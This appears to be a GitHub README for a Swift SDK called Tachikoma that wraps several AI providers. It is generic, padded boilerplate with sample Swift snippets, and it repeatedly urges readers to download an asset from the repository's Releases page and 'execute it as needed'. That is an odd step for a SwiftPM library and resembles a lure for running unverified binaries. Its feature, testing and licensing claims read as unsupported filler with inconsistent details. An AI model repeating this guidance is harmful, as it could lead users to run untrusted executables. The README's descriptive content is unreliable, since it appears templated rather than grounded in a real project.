https://github.com/Xiorykrm/Tachikoma/releases

# Tachikoma: One Interface for All AI Models — Swift SDK

[![Releases](https://img.shields.io/badge/releases-download-brightgreen?style=for-the-badge&logo=github)](https://github.com/Xiorykrm/Tachikoma/releases) [![Swift](https://img.shields.io/badge/Swift-5.9-brightblue?style=for-the-badge&logo=swift)](https://swift.org) [![AI SDK](https://img.shields.io/badge/AI_SDK-Toolkit-brightgreen?style=for-the-badge&logo=brain) ](https://github.com/Xiorykrm/Tachikoma/releases)

Overview
- Tachikoma is a Swift SDK that gives you a single interface to talk to multiple AI providers.
- It focuses on simplicity, safety, and speed. It aims to hide provider quirks behind a clean, consistent API.
- The name nods to a capable, curious assistant that can handle many tasks without changing tools.

Key ideas
- One interface, many models. You switch providers without rewriting your code.
- Focus on the flow you care about: ask, respond, refine, and iterate.
- The SDK is modular. New providers plug in with minimal changes to your app code.

What makes Tachikoma different
- Unified request/response models. You send a chat or completion request and get back structured results.
- Strong typing. The API models reflect common AI payloads so you catch issues at compile time.
- Optional streaming. If a provider supports it, you can stream results for responsive UIs.
- Safe defaults. Timeouts, retries, and error handling are baked in so you can ship faster.

Architecture at a glance
- Client layer: A small, fast facade to the provider layer. It gives you a clean API surface with consistent usage.
- Provider layer: Adapters that translate the SDK calls into provider-specific requests. This isolates changes to one place.
- Models: Clear, strongly typed request and response objects. They cover chat, completions, and embeddings.
- Utilities: Helpers for rate limits, batching, token counting, and credentials management.
- Extensions: Mechanisms to add new providers without touching core code.

What you can build with Tachikoma
- Cross-provider chat bots with a uniform interface.
- Quick prototyping tools that switch between providers to compare results.
- Apps that need embeddings for search, similarity, or clustering across models.
- Internal assistants for teams that must switch providers due to policy or cost.

Getting started
- Prerequisites: macOS or Linux, Xcode for Swift tooling, and a Swift toolchain that supports Swift Package Manager.
- Install: Use Swift Package Manager to pull Tachikoma into your project.
- Basic usage: Create a client, choose a provider, send a request, handle the response.

Prerequisites
- Swift 5.9 or newer
- macOS 12+ or Linux with Swift toolchain installed
- Basic knowledge of async/await in Swift
- Access keys for at least one AI provider (for example, an OpenAI API key)

Installation
- Add Tachikoma to your Swift package manifest
  - In the dependencies section of Package.swift:
    - .package(url: "https://github.com/Xiorykrm/Tachikoma.git", from: "0.1.0")
  - Then add the product to your targets:
    - .product(name: "Tachikoma", package: "Tachikoma")
- If you use Xcode, add Tachikoma as a SwiftPM dependency via File > Swift Packages > Add Package Dependency and point to the same Git URL.

Usage quick start
- Import the SDK
  - import Tachikoma
- Create a client with a provider
  - let client = Tachikoma(provider: .openAI(apiKey: "OPENAI_API_KEY"))
- Send a chat request
  - Task {
      let request = ChatRequest(messages: [ .init(role: .user, content: "Hello, Tachikoma!") ])
      let result = try await client.chat(request: request)
      print("Reply:", result.choices.first?.message.content ?? "No reply")
    }
- Read a completion
  - Task {
      let request = CompletionRequest(prompt: "Explain quantum dots in simple terms.", maxTokens: 150)
      let response = try await client.complete(request: request)
      print("Response:", response.text)
    }
- Use embeddings for search
  - Task {
      let vectors = try await client.embeddings(for: ["Swift", "AI SDK", "Providers"])
      // vectors.results gives you embedding data
    }

Download and release note workflow
- The latest release assets live in the Releases page. If you want to grab a binary or a prebuilt artifact, visit that page and download the asset that fits your platform. The Releases page hosts the artifacts you can run or integrate.
- Since the link points to a releases page, you should download the asset from that page and execute it as needed by your project. For the most up-to-date builds, check the Releases section. You can also revisit the releases page whenever you need to verify version compatibility or access sample code bundles.

Provider support and extensibility
- Built-in providers
  - OpenAI: OpenAI's models and chat endpoints with an API key.
  - Anthropic: Claude-like models with straightforward prompts and responses.
  - Cohere: Text generation and embeddings for quick experiments.
  - Google Palm or similar providers: For experiments with alternative model families.
- Custom providers
  - Tachikoma offers a provider plug-in mechanism. You can implement a provider adapter that conforms to a Provider protocol and swap it into the client without changing your app's core logic.

Provider adapters explained
- Each adapter translates the SDK’s common request format into a provider-specific API call.
- The adapter handles:
  - Endpoint URLs
  - Parameter names mapping
  - Authentication method
  - Error and rate limit handling
- The goal is to keep your app code provider-agnostic, so you can compare models or integrate new providers with minimal changes.

API surface overview
- Client
  - Initialization with a selected provider
  - Methods for chat, completion, and embeddings
  - Optional streaming mode
  - Async error handling
- Requests
  - ChatRequest, CompletionRequest, EmbeddingsRequest
  - Options for max tokens, temperature, top_p, and stop sequences
- Responses
  - ChatResponse, CompletionResponse, EmbeddingsResponse
  - Access to choices, usage stats, and model metadata
- Utilities
  - Token counting, rate limit handling, and simple retry logic
- Extensions
  - Newsfeeds, caching strategies, or custom loggers

Code samples: real-world patterns
- Minimal chat flow
  - import Tachikoma
  - let client = Tachikoma(provider: .openAI(apiKey: "OPENAI_API_KEY"))
  - Task {
      let req = ChatRequest(messages: [.init(role: .user, content: "What is Tachikoma?")])
      let resp = try await client.chat(request: req)
      print("AI:", resp.choices.first?.message.content ?? "")
    }
- Embedding-based search
  - Task {
      let texts = ["Swift", "AI", "SDK"]
      let req = EmbeddingsRequest(input: texts)
      let res = try await client.embeddings(request: req)
      // Use res.data for similarity checks
    }

Architecture deep dive
- Module boundaries
  - Client: The top-level API entry point a developer uses.
  - Provider: A set of adapters for different models and endpoints.
  - Model layer: Lightweight, typed representations of common AI payloads.
  - Utils: Helpers for common tasks across providers.
- Error handling strategy
  - Clear error types for network, provider, and shape mismatches.
  - Retries with backoff and per-provider limits to avoid spamming the service.
- Performance considerations
  - Streaming support reduces latency for interactive UIs.
  - Batching utilities to combine multiple requests when the provider allows it.
  - Lightweight serialization and deserialization for fast round-trips.

Testing and quality
- Unit tests cover the client logic and provider adapters.
- Integration tests validate end-to-end flows with a live provider (where allowed by policy).
- Snapshot tests ensure response shapes stay consistent across minor changes.
- Mock providers help simulate errors, rate limits, and edge cases.

CI and release process
- GitHub Actions pipelines run on pull requests and pushes to main.
- Linting and type checks run on every build.
- Tests execute across supported Swift versions and platforms.
- Releases are versioned or pinned to tag-based artifacts to ensure compatibility.

Localization and accessibility
- The SDK uses clear, concise messages suitable for a global audience.
- Error messages are short and actionable.
- Documentation includes examples in multiple languages where relevant and in-app fallbacks for common UI strings.

Security, privacy, and compliance
- Keys are not hard-coded; the SDK encourages secure storage and retrieval from the keychain or vault.
- Network calls use TLS and standard best practices for authentication.
- Help is provided on configuring per-provider access controls and auditing usage.

Performance tuning and optimization
- Streaming mode is optional; disable it if you prefer non-streaming results.
- Token usage tracking helps you estimate costs and plan prompts.
- Caching strategies can reduce repeated calls for static prompts or embeddings.

Contributing
- The project welcomes contributions that improve clarity, reliability, and performance.
- Typical contribution paths:
  - Bug fixes: Small, well-scoped changes with tests.
  - Features: Clear design proposals with a minimal API impact.
  - Documentation: Improve examples, add guides, and update references.
- How to contribute:
  - Fork the repository.
  - Create a feature branch with a descriptive name.
  - Add tests or examples that demonstrate the change.
  - Open a pull request with a concise description.

Documentation and learning resources
- API docs are generated from source and kept in sync with code.
- Quickstart guides help new users wire Tachikoma into their app in minutes.
- Tutorials show real-world patterns for chat, completion, and embeddings.

Examples and community
- Real-world example apps illustrate common patterns.
- Community forums and chat groups provide a space to ask questions and share ideas.
- The project maintains sample code bundles and example integrations to speed up learning.

Versioning and compatibility
- The SDK uses semantic versioning.
- Public API changes are tracked in release notes.
- Breaking changes are documented and given migration steps.

Changelog and release notes
- Each release includes a summary of changes, bug fixes, and new features.
- Users can scan the notes to decide when to upgrade.
- The latest release link is accessible from the Releases page, which you can visit to verify changes. If you need to download a specific asset, navigate to that page and fetch the appropriate artifact. The link provided above points to the release hub, and the same URL is referenced here for quick access: https://github.com/Xiorykrm/Tachikoma/releases

Roadmap
- Expand provider coverage to more AI models and services.
- Improve multi-provider orchestration to balance speed, cost, and quality.
- Add more sample apps and templates for common use cases.
- Strengthen developer guides with best practices for prompts and memory management.
- Introduce advanced tooling for prompt engineering and evaluation.

Guides and best practices
- Prompts and prompts tuning
  - Start with a clear system message.
  - Keep user prompts concise but specific.
  - Use iterative refinement to shape responses.
- Cost awareness
  - Track token usage per request.
  - Compare model quality and cost for your use case.
  - Use embeddings wisely to reduce duplication.
- Error handling
  - Build retry strategies with backoff.
  - Distinguish transient errors from permanent failures.
  - Surface actionable error messages to users.

FAQ
- What is Tachikoma used for?
  - It provides a single Swift interface to talk to multiple AI providers, letting you swap models with minimal code changes.
- Do I need to know every provider?
  - Not at first. Start with one provider to learn the flow, then add others as needed.
- Can I use Tachikoma in a production app?
  - Yes. The design favors reliability, safety, and clean integration.

Licensing
- Tachikoma is released under a permissive license that supports both open source and commercial use.
- The license terms are visible in the repository and explained in the LICENSE file.

Acknowledgments
- A nod to the open-source community that contributes tools, ideas, and inspiration.
- Thanks to early adopters who helped shape the API with feedback and real-world use cases.
- Emoji markers celebrate milestones and community efforts.

Appendix: quick reference
- Provider switch: swap adapters without touching your app logic.
- Request patterns: chat, completion, embeddings.
- Response handling: access choices, usage, and metadata in a consistent way across providers.

Downloads and releases
- For binaries, libraries, and sample projects, visit the Releases page to download the assets that fit your platform and needs. The page hosts the artifacts as separate items so you can pick the one that matches your environment. If you want to inspect the latest builds or read release notes, the Releases page is your destination. The link you can use to reach this hub is the same one used above: https://github.com/Xiorykrm/Tachikoma/releases

Appendix: sample project structure
- Package.swift
- Sources/
  - Tachikoma/
    - Client.swift
    - Providers/
      - OpenAIProvider.swift
      - AnthropicProvider.swift
      - CohereProvider.swift
    - Models/
      - ChatRequest.swift
      - CompletionRequest.swift
      - EmbeddingsRequest.swift
      - ChatResponse.swift
      - CompletionResponse.swift
      - EmbeddingsResponse.swift
    - Utilities/
      - TokenCounter.swift
      - RetryPolicy.swift
    - Extensions/
      - Logging.swift
      - Metrics.swift
- Tests/
  - TachikomaTests/
  - ProvidersTests/
- README.md (this file)
- Examples/
  - QuickStart.xcworkspace
  - ChatBotDemo/

Usage motivation and best practices
- Start with the simplest flow. Get a chat request working before adding streaming or embeddings.
- Keep prompts tight. Short prompts tend to be clearer and cheaper.
- Structure responses with a stable model. Favor consistency across providers to simplify UI logic.
- Measure, compare, and iterate. You can run quick side-by-side tests across providers to pick the best fit.
- Plan for fallback. If a provider is down, the SDK should allow a seamless switch to a backup provider.

Ecosystem integration
- Works well with UI frameworks like SwiftUI and AppKit.
- Compatible with server-side Swift backends that support Swift Package Manager.
- Extends easily to mobile apps with offline-friendly flows where possible.

Accessibility and UX considerations
- Offer status indicators for provider health and response times.
- Provide clear progress feedback during long prompts or embeddings fetch.
- Ensure error messages guide developers to actionable steps so users see helpful results quickly.

Brand voice and tone
- Calm, clear, and helpful. The SDK is built to empower developers to deliver reliable AI features without getting bogged down in provider quirks.
- The language in code samples stays straightforward, with emphasis on readability and correctness.

Security and deployment notes
- Avoid exposing API keys in source control; use secure storage mechanisms.
- Prefer per-provider scopes and limited credentials where possible.
- Review endpoint configurations and cipher suites in production environments.

Final notes
- Tachikoma aims to be a dependable bridge to AI models, making it easy to switch and compare providers.
- The project favors clarity and simplicity, with a design that scales from tiny apps to large platforms.

End of document.